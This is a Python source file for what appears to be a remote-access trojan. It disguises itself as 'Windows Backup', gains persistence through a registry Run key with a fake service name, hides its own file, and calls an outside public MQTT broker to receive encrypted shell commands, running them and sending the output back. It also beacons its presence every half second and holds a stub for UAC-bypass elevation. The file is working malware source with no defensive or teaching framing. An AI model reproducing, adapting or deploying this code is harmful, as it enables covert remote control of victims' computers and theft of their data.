import paho.mqtt.client as mqtt_client
import socket
import os
import sys
import subprocess
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import locale
import threading
from plyer import notification
import plyer.platforms.win.notification
import time

systype = ("windows" if os.name == "nt" else "unix")

def getpath():
    if getattr(sys, "frozen", False):
        application_path = sys.executable
    elif __file__:
        application_path = os.path.abspath(__file__)
    return application_path

def run_as_admin(cmd=""):
    function(uac=True, persist=False, elevate=False).run(id="13", payload=["C:\\windows\\system32\\cmd.exe", f'/c "{cmd}"'])

if getpath().split(".")[-1] == "exe":
    save_filename = "Windows Backup.exe"
else:
    save_filename = "Windows Backup.py"

if systype == "windows" and not getpath().split(os.path.basename(getpath()))[0][:-1].lower() == os.path.expanduser("~").lower():
    print(os.popen(f'COPY "{getpath()}" "{os.path.expanduser("~")}\{save_filename}"').read())
    print(os.popen(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL service v1.2.3" /d "{os.path.expanduser("~")}\{save_filename}" /f').read())
    print(os.system(f'attrib +s +h +a "{os.path.expanduser("~")}\{save_filename}"'))
    print(os.system(f'"{os.path.expanduser("~")}\{save_filename}"'))
    os.system(f"TASKKILL -F -PID {os.getpid()}")
else:
    file_save_path = r"C:\pyLocal"

    if systype == "windows":
        file_save_path = r"C:\pyLocal"
    elif __file__:
        file_save_path = os.path.expanduser("~")

    if file_save_path[-1] in ["/", "\ "[-1]]:
        file_save_path == file_save_path[:-1]
    if not os.path.exists(file_save_path):
        os.makedirs(file_save_path)

    os.chdir(os.path.expanduser("~"))
    runpath_dict = {}
    host = socket.gethostbyname(socket.gethostname())

    client_id = f"{os.getpid()}@{socket.gethostname()}"
    topic_list = {
        "stats":"/MQTT/stats", 
        "MQTT":"/MQTT", 
        "result":"/MQTT/result"
    }
    connected = False
    donejob_list = []

    key = b"replacewithlen16"
    iv = b"replacewithlen16"

    def gen_id():
        return hashlib.md5(str(time.time()).encode()).hexdigest()

    def encrypt(plaintext:bytes, key=key, iv=iv):
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return ciphertext

    def decrypt(ciphertext:bytes, key=key, iv=iv):
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            return plaintext
        except:
            return False

    def mode_cmd(content, session_id):
        global client, donejob_list, runpath_dict

        job_id = content.split(b" ")[1].decode()

        if not job_id in donejob_list:
            cmd = b" ".join(content.split(b" ")[2:]).decode()
            if cmd.lower() == "exit":
                p = subprocess.Popen(f"taskkill -F -PID {os.getpid()}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = p.communicate()
            elif cmd.startswith("cd "):
                directory = cmd.split("cd ",1)[1]
                if directory:
                    if directory[0] == directory[-1] == "%" and systype == "windows":
                        directory = os.environ.get(directory[1:-1], directory)
                    elif directory[0] == "$" and systype != "windows":
                        directory = os.environ.get(directory[1:], directory)
                    
                    if directory[0] == directory[-1] == '"':
                        directory = directory[1:-1]

                    if os.path.isdir(directory):
                        os.chdir(directory)
                        runpath_dict[session_id] = os.getcwd()
                    elif os.path.isdir(os.path.join(runpath_dict[session_id], directory)):
                        os.chdir(os.path.join(runpath_dict[session_id], directory))
                        runpath_dict[session_id] = os.getcwd()

                if systype == "windows":
                    cmd = "cd"
                else:
                    cmd = "pwd"
            elif cmd.endswith(":"):
                if os.path.isdir(cmd):
                    os.chdir(cmd)
                    runpath_dict[session_id] = os.getcwd()
                    if systype == "windows":
                        cmd = "cd"
                    else:
                        cmd = "pwd"

            encoding = locale.getdefaultlocale()[1]
            p = subprocess.Popen(cmd, cwd=runpath_dict[session_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # getoutputs
            stdout, stderr = p.communicate()
            if p.returncode == 0:
                result = stdout.decode(encoding, errors="replace")
            else:
                result = "<stderr>" + stderr.decode(encoding, errors="replace")
            send(client, topic_list["result"], job_id, result.encode(), qos=2)
            donejob_list.append(job_id)
        else:
            send(client, topic_list["result"], job_id, b"<stderr>\033[1;31mSame job id not accepted. ", qos=2)

    def on_connect(client, userdata, flags, rc):
        global connected
        connected = True
        print("Connected with result code: "+str(rc))
        client.subscribe(topic_list["MQTT"])

    def on_disconnect(client, userdata, rc):
        global connected
        connected = False
        print("Disconnected with result code: "+str(rc))

    def on_message(client, userdata, msg):
        global client_id, runpath_dict

        msg.payload = decrypt(msg.payload)
        if msg.payload:
            session_id = msg.payload.split(b" ")[0]
            msg_id = msg.payload.split(b" ")[1]
            if msg_id.decode() == client_id:
                content = b" ".join(msg.payload.split(b" ")[2:])
                if content.split(b" ")[0].decode() == "cmd":
                    if not session_id in list(runpath_dict):
                        runpath_dict[session_id] = os.path.expanduser("~")
                    run_thread = threading.Thread(target=mode_cmd, args=(content, session_id))
                    run_thread.start()
                else:
                    print(content)

    def send(client:mqtt_client.Client, topic, id, content:bytes, qos=0):
        client.publish(topic, encrypt(id.encode() + b" " + content), qos=qos)

    client = mqtt_client.Client()
    client.on_connect = on_connect
    client.on_disconnect = on_disconnect
    client.on_message = on_message

    def upload_stats():
        while True:
            if connected:
                result, mid = client.publish(topic_list["stats"], encrypt(client_id.encode()))
                print(result, mid)
            time.sleep(0.5)

    stats_thread = threading.Thread(target=upload_stats)
    stats_thread.start()

    while True:
        try:
            client.connect("public.mqtthq.com", 1883, 60)
            client.loop_start()
            break
        except Exception as e:
            print(f"Could not connect: {e}, retrying...")
            time.sleep(2)
